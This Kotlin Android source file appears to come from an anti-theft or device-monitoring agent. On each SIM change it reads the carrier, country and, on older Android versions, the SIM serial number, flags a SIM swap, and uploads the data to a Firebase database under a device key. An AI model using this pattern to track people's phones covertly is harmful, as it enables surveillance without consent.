package com.guard.agent.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.TelephonyManager
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.core.DeviceKey
import com.guard.agent.core.PrefsManager
import com.guard.agent.utils.Logger

class SimReceiver : BroadcastReceiver() {

    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_SIM_STATE_CHANGED) return

        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val carrier = tm.networkOperatorName ?: "unknown"
            val simState = intent.getStringExtra("ss") ?: "unknown"
            val countryIso = tm.simCountryIso ?: "unknown"

            val data = mutableMapOf<String, Any>(
                "carrier" to carrier,
                "simState" to simState,
                "countryIso" to countryIso,
                "time" to System.currentTimeMillis()
            )

            // SIM serial number (Android 10+ pe restricted hai)
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                @Suppress("DEPRECATION")
                val serial = tm.simSerialNumber
                if (!serial.isNullOrBlank()) {
                    data["serial"] = serial

                    // Check if SIM changed
                    val oldSim = PrefsManager.getString(Constants.KEY_OLD_SIM)
                    if (oldSim != null && oldSim != serial) {
                        data["simChanged"] = true
                        Logger.d("SimReceiver", "SIM CHANGED! Old=$oldSim New=$serial")
                    }
                    PrefsManager.putString(Constants.KEY_OLD_SIM, serial)
                }
            }

            val key = DeviceKey.get(ctx)
            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(key).child(Constants.SUB_SIM)
                .setValue(data)

            Logger.d("SimReceiver", "SIM event pushed: $simState / $carrier")
        } catch (e: Exception) {
            Logger.e("SimReceiver", "SIM handling failed", e)
        }
    }
}
